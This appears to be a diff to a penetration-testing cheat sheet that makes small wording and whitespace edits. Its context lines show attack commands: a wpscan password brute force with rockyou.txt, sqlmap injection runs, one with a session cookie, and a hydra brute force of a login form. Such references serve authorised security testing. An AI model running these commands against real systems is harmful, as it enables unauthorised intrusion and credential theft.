@@ -72,7 +72,7 @@ openssl s_client -connect <HOST>:<PORT> -quiet
 nc -zv <HOST> <PORT>
 ```
 
-## Information Gathering
+## Recon
 
 #### Passive
 
@@ -2985,7 +2985,7 @@ wpscan --url http://<TARGET_IP> -U admin -P /usr/share/wordlists/rockyou.txt
 ```bash
 sqlmap -r <REQUEST_FILE> -p <POST_PARAMETER>
 sqlmap -r Post.req
-
+	
 sqlmap -u "http://<TARGET_IP>/sqli_1.php?title=hacking&action=search" --cookie "PHPSESSID=rmoepg39ac0savq89d1k5fu2q1; security_level=0" -p title
 
 sqlmap -u "http://10.10.10.10/file.php?id=1" -p id          #GET Method
@@ -3097,8 +3097,7 @@ hydra -L <USERS_LIST> -P <PW_LIST> <TARGET_IP> http-post-form "/login.php:login=
 
 In **wp-config.php** you can find the root password of the database.
 
-Default login paths to check: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_
-
+Default login paths to check: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**
 #### **Main WordPress Files**
 
 * `index.php`
